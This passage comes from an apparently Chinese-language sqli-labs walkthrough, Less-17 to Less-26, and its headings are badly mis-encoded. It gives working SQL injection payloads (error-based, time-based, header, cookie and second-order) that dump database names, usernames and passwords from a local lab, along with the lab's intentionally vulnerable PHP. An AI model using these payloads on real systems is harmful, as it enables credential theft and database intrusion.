id="Less-17-POST-Update-Query-Error-Based-String-åŸºäºé”™è¯¯çš„æ›´æ–°æŸ¥è¯¢POSTæ³¨å…¥"><a href="#Less-17-POST-Update-Query-Error-Based-String-åŸºäºé”™è¯¯çš„æ›´æ–°æŸ¥è¯¢POSTæ³¨å…¥" class="headerlink" title="Less-17 POST - Update Query- Error Based - String (åŸºäºé”™è¯¯çš„æ›´æ–°æŸ¥è¯¢POSTæ³¨å…¥)"></a>Less-17 POST - Update Query- Error Based - String (åŸºäºé”™è¯¯çš„æ›´æ–°æŸ¥è¯¢POSTæ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-14"><a href="#æ‰‹åŠ¨æ³¨å…¥-14" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æŠ¥é”™æ³¨å…¥</span></span><br><span class="line">uname=admin&amp;passwd=11&#x27;<span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@version</span>),0x7e))<span class="comment">#&amp;submit=Submit</span></span><br><span class="line"><span class="comment">#å»¶æ—¶æ³¨å…¥</span></span><br><span class="line">uname=admin&amp;passwd=<span class="number">11</span><span class="string">&#x27;and If(ascii(substr(database(),1,1))=115,1,sleep(5))#&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-15"><a href="#æºç åˆ†æ-15" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$con1</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// truncation (see comments)</span></span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Quote if not a number</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$uname</span>=<span class="title function_ invoke__">check_input</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);  </span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>åœ¨<code>less-17</code>çš„<code>check_input()</code>ä¸­ï¼Œå¯¹ username è¿›è¡Œå„ç§è½¬ä¹‰çš„å¤„ç†ï¼Œæ‰€ä»¥æ­¤å¤„ä¸èƒ½ä½¿ç”¨usernameè¿›è¡Œæ³¨å…¥ã€‚</p><h4 id="å‡½æ•°ç®€ä»‹"><a href="#å‡½æ•°ç®€ä»‹" class="headerlink" title="å‡½æ•°ç®€ä»‹"></a>å‡½æ•°ç®€ä»‹</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">addslashes</span>() <span class="comment">#å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ï¼Œå¦‚å•å¼•å·ï¼ˆ&#x27;ï¼‰ï¼ŒåŒå¼•å·ï¼ˆ&quot;ï¼‰ï¼Œåæ–œæ ï¼ˆ\ï¼‰ï¼ŒNULLã€‚</span></span><br><span class="line"><span class="title function_ invoke__">stripslashes</span>() <span class="comment">#å‡½æ•°åˆ é™¤ç”± addslashes() å‡½æ•°æ·»åŠ çš„åæ–œæ ã€‚</span></span><br><span class="line"><span class="title function_ invoke__">mysql_real_escape_string</span>() <span class="comment">#å‡½æ•°è½¬ä¹‰ SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦,å¦‚\x00ï¼Œ\nï¼Œ\rï¼Œ\ï¼Œ&#x27;ï¼Œ&quot;ï¼Œ\x1aã€‚</span></span><br></pre></td></tr></table></figure><h3 id="Less-18-POST-Header-Injection-Uagent-field-Error-based-åŸºäºé”™è¯¯çš„ç”¨æˆ·ä»£ç†ï¼Œå¤´éƒ¨POSTæ³¨å…¥"><a href="#Less-18-POST-Header-Injection-Uagent-field-Error-based-åŸºäºé”™è¯¯çš„ç”¨æˆ·ä»£ç†ï¼Œå¤´éƒ¨POSTæ³¨å…¥" class="headerlink" title="Less-18 POST - Header Injection - Uagent field - Error based (åŸºäºé”™è¯¯çš„ç”¨æˆ·ä»£ç†ï¼Œå¤´éƒ¨POSTæ³¨å…¥)"></a>Less-18 POST - Header Injection - Uagent field - Error based (åŸºäºé”™è¯¯çš„ç”¨æˆ·ä»£ç†ï¼Œå¤´éƒ¨POSTæ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-15"><a href="#æ‰‹åŠ¨æ³¨å…¥-15" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>åˆ©ç”¨æŠ“åŒ…å·¥å…·ä¿®æ”¹<code>user-agent</code>å³å¯</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">&#x27;<span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@version</span>),0x7e)) and <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/HklOqKTNYZFoMuD.png" alt="18_2.png"></p><h4 id="æºç åˆ†æ-16"><a href="#æºç åˆ†æ-16" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br></pre></td></tr></table></figure><p>å¯¹ uname å’Œ passwd è¿›è¡Œäº† check_input()å‡½æ•°çš„å¤„ç†ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è¾“å…¥uname å’Œpasswdä¸Šè¿›è¡Œæ³¨å…¥æ˜¯ä¸è¡Œçš„ï¼Œä½†å¯ä»¥åˆ©ç”¨insertã€‚</p><h3 id="Less-19-POST-Header-Injection-Referer-field-Error-based-åŸºäºå¤´éƒ¨çš„Referer-POSTæŠ¥é”™æ³¨å…¥"><a href="#Less-19-POST-Header-Injection-Referer-field-Error-based-åŸºäºå¤´éƒ¨çš„Referer-POSTæŠ¥é”™æ³¨å…¥" class="headerlink" title="Less-19 POST - Header Injection - Referer field - Error based (åŸºäºå¤´éƒ¨çš„Referer POSTæŠ¥é”™æ³¨å…¥)"></a>Less-19 POST - Header Injection - Referer field - Error based (åŸºäºå¤´éƒ¨çš„Referer POSTæŠ¥é”™æ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-16"><a href="#æ‰‹åŠ¨æ³¨å…¥-16" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>ä¿®æ”¹<code>referer</code>å³å¯ã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">&#x27;<span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@basedir</span>),0x7e)) and <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-17"><a href="#æºç åˆ†æ-17" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line"><span class="variable">$passwd</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-20-POST-Cookie-injections-Uagent-field-Error-based-åŸºäºé”™è¯¯çš„cookieå¤´éƒ¨POSTæ³¨å…¥"><a href="#Less-20-POST-Cookie-injections-Uagent-field-Error-based-åŸºäºé”™è¯¯çš„cookieå¤´éƒ¨POSTæ³¨å…¥" class="headerlink" title="Less-20 POST - Cookie injections - Uagent field - Error based (åŸºäºé”™è¯¯çš„cookieå¤´éƒ¨POSTæ³¨å…¥)"></a>Less-20 POST - Cookie injections - Uagent field - Error based (åŸºäºé”™è¯¯çš„cookieå¤´éƒ¨POSTæ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-17"><a href="#æ‰‹åŠ¨æ³¨å…¥-17" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>æ·»åŠ <code>cookie</code>å³å¯</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">uname=admin1&#x27;<span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@basedir</span>),0x7e))<span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/VdL9Es5qwCboOKx.png" alt="20.png"></p><h4 id="æºç åˆ†æ-18"><a href="#æºç åˆ†æ-18" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line"><span class="variable">$passwd</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;uname&#x27;</span>, <span class="variable">$cookee</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br></pre></td></tr></table></figure><h3 id="Less-21-Cookie-Injection-Error-Based-complex-string"><a href="#Less-21-Cookie-Injection-Error-Based-complex-string" class="headerlink" title="Less-21 Cookie Injection- Error Based- complex - string"></a>Less-21 Cookie Injection- Error Based- complex - string</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-18"><a href="#æ‰‹åŠ¨æ³¨å…¥-18" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>å¯¹<code>Cookie</code>è¿›è¡Œ<code>base64</code>ç¼–ç å³å¯</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">Cookieï¼š</span><br><span class="line">uname=YWRtaW4xJylhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBAQGJhc2VkaXIpLDB4N2UpKSM=</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-19"><a href="#æºç åˆ†æ-19" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$con1</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">20</span>); <span class="comment">// truncation (see comments)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())  <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))   <span class="comment">// Quote if not a number</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$value</span>) . <span class="string">&#x27;&quot;&#x27;</span>; <span class="comment">//æ·»åŠ äº†&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;uname&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>]), <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br></pre></td></tr></table></figure><h3 id="Less-22-Cookie-Injection-Error-Based-Double-Quotes-string-åŸºäºé”™è¯¯çš„åŒå¼•å·å­—ç¬¦å‹Cookieæ³¨å…¥"><a href="#Less-22-Cookie-Injection-Error-Based-Double-Quotes-string-åŸºäºé”™è¯¯çš„åŒå¼•å·å­—ç¬¦å‹Cookieæ³¨å…¥" class="headerlink" title="Less-22 Cookie Injection- Error Based- Double Quotes - string (åŸºäºé”™è¯¯çš„åŒå¼•å·å­—ç¬¦å‹Cookieæ³¨å…¥)"></a>Less-22 Cookie Injection- Error Based- Double Quotes - string (åŸºäºé”™è¯¯çš„åŒå¼•å·å­—ç¬¦å‹Cookieæ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-19"><a href="#æ‰‹åŠ¨æ³¨å…¥-19" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>ä¸less-21ä¸€æ ·éœ€è¦base64ç¼–ç </p><h4 id="æºç åˆ†æ-20"><a href="#æºç åˆ†æ-20" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$con1</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">20</span>); <span class="comment">// truncation (see comments)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())  <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))   <span class="comment">// Quote if not a number</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;<span class="comment">//æ·»åŠ äº†&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;uname&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>]), <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br></pre></td></tr></table></figure><h2 id="Page-2-Advanced-Injections"><a href="#Page-2-Advanced-Injections" class="headerlink" title="Page-2 (Advanced Injections)"></a>Page-2 (Advanced Injections)</h2><h3 id="Less-23-GET-Error-based-strip-comments-åŸºäºé”™è¯¯çš„ï¼Œè¿‡æ»¤æ³¨é‡Šçš„GETå‹"><a href="#Less-23-GET-Error-based-strip-comments-åŸºäºé”™è¯¯çš„ï¼Œè¿‡æ»¤æ³¨é‡Šçš„GETå‹" class="headerlink" title="Less-23 GET - Error based - strip comments (åŸºäºé”™è¯¯çš„ï¼Œè¿‡æ»¤æ³¨é‡Šçš„GETå‹)"></a>Less-23 GET - Error based - strip comments (åŸºäºé”™è¯¯çš„ï¼Œè¿‡æ»¤æ³¨é‡Šçš„GETå‹)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-20"><a href="#æ‰‹åŠ¨æ³¨å…¥-20" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#è·å–è·¯å¾„</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,@<span class="variable">@basedir</span>,<span class="string">&#x27;3</span></span><br><span class="line"><span class="string">#è·å–æ•°æ®åº“å</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;</span>union <span class="literal">select</span> <span class="number">1</span>,(<span class="literal">select</span> group_concat(schema_name) from information_schema.schemata),<span class="string">&#x27;3</span></span><br><span class="line"><span class="string">#è·å–securityä¸­æ‰€æœ‰è¡¨å</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;</span>union <span class="literal">select</span> <span class="number">1</span>,(<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;security&#x27;</span>),<span class="string">&#x27;3</span></span><br><span class="line"><span class="string">#è·å–usersä¸­æ‰€æœ‰åˆ—å</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;</span>union <span class="literal">select</span> <span class="number">1</span>,(<span class="literal">select</span> group_concat(column_name) from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span>),<span class="string">&#x27;3</span></span><br><span class="line"><span class="string">#è·å–usersä¸­usernameè¿™ä¸€åˆ—å†…å®¹</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;</span>union <span class="literal">select</span> <span class="number">1</span>,(<span class="literal">select</span> group_concat(username) from security.users limit <span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;3</span></span><br><span class="line"><span class="string">#è·å–usersä¸­passwordè¿™ä¸€åˆ—å†…å®¹</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;</span>union <span class="literal">select</span> <span class="number">1</span>,(<span class="literal">select</span> group_concat(password) from security.users limit <span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#æŠ¥é”™æ³¨å…¥è·å–æ•°æ®åº“å</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=1&#x27;</span>or extractvalue(<span class="number">1</span>,concat(0x7e,database())) or <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-21"><a href="#æºç åˆ†æ-21" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//filter the comments out so as to comments should not work</span></span><br><span class="line"><span class="variable">$reg</span> = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line"><span class="variable">$reg1</span> = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line"><span class="variable">$replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg1</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†<code>#</code>å’Œ<code>--</code>è¿™ä¸¤ç§æ³¨é‡Šç¬¦å·ã€‚</p><h3 id="Less-24-Second-Degree-Injections-Real-treat-Store-Injections-äºŒæ¬¡æ³¨å…¥"><a href="#Less-24-Second-Degree-Injections-Real-treat-Store-Injections-äºŒæ¬¡æ³¨å…¥" class="headerlink" title="Less - 24 Second Degree Injections Real treat -Store Injections (äºŒæ¬¡æ³¨å…¥)"></a>Less - 24 Second Degree Injections Real treat -Store Injections (äºŒæ¬¡æ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-21"><a href="#æ‰‹åŠ¨æ³¨å…¥-21" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>æ³¨å†Œä¸€ä¸ªè´¦å·ä¸º<code>admin&#39;#</code>çš„è´¦æˆ·</p><p><img src="https://s2.loli.net/2022/05/17/DHwAEfZskga84Cb.png" alt="24_1.png"></p><p>æ³¨å†ŒæˆåŠŸååœ¨åå°å¯ä»¥çœ‹åˆ°ä¿¡æ¯</p><p><img src="https://s2.loli.net/2022/05/17/r3VvX1DF96auLeI.png" alt="24_2.png"></p><p>ç”¨åˆšæ³¨å†Œçš„è´¦å·ç™»å½•å¹¶ä¿®æ”¹å¯†ç å³å¯æ›´æ”¹<code>admin</code>çš„å¯†ç </p><p><img src="https://s2.loli.net/2022/05/17/vnFTACyI8aXpM9J.png" alt="24_3.png"></p><h4 id="æºç åˆ†æ-22"><a href="#æºç åˆ†æ-22" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-25-Trick-with-OR-amp-AND-è¿‡æ»¤äº†orå’Œand"><a href="#Less-25-Trick-with-OR-amp-AND-è¿‡æ»¤äº†orå’Œand" class="headerlink" title="Less-25 Trick with OR &amp; AND (è¿‡æ»¤äº†orå’Œand)"></a>Less-25 Trick with OR &amp; AND (è¿‡æ»¤äº†orå’Œand)</h3><h4 id="ç»•è¿‡orå’Œandè¿‡æ»¤"><a href="#ç»•è¿‡orå’Œandè¿‡æ»¤" class="headerlink" title="ç»•è¿‡orå’Œandè¿‡æ»¤"></a>ç»•è¿‡orå’Œandè¿‡æ»¤</h4><p>ï¼ˆ1ï¼‰å¤§å°å†™å˜å½¢ Or,OR,oR </p><p>ï¼ˆ2ï¼‰ç¼–ç ï¼Œhexï¼Œurlencode </p><p>ï¼ˆ3ï¼‰æ·»åŠ æ³¨é‡Š&#x2F;*or*&#x2F; </p><p>ï¼ˆ4ï¼‰åˆ©ç”¨ç¬¦å· and&#x3D;&amp;&amp; or&#x3D;||</p><h4 id="æ‰‹åŠ¨æ³¨å…¥-22"><a href="#æ‰‹åŠ¨æ³¨å…¥-22" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-25/?id=1&#x27;||1=1--+ </span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-25/?id=1&#x27;<span class="attribute">OOrr</span> <span class="number">1</span>=<span class="number">1</span>--+ </span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-23"><a href="#æºç åˆ†æ-23" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less-25a-Trick-with-OR-amp-AND-Blind-è¿‡æ»¤äº†orå’Œandçš„ç›²æ³¨"><a href="#Less-25a-Trick-with-OR-amp-AND-Blind-è¿‡æ»¤äº†orå’Œandçš„ç›²æ³¨" class="headerlink" title="Less-25a Trick with OR &amp; AND Blind (è¿‡æ»¤äº†orå’Œandçš„ç›²æ³¨)"></a>Less-25a Trick with OR &amp; AND Blind (è¿‡æ»¤äº†orå’Œandçš„ç›²æ³¨)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-23"><a href="#æ‰‹åŠ¨æ³¨å…¥-23" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-25a/?id=-1 <span class="attribute">UNION</span> <span class="literal">select</span> <span class="number">1</span>,@<span class="variable">@basedir</span>,<span class="number">3</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="Less-26-Trick-with-comments-and-space-è¿‡æ»¤äº†æ³¨é‡Šå’Œç©ºæ ¼çš„æ³¨å…¥"><a href="#Less-26-Trick-with-comments-and-space-è¿‡æ»¤äº†æ³¨é‡Šå’Œç©ºæ ¼çš„æ³¨å…¥" class="headerlink" title="Less-26 Trick with comments and space 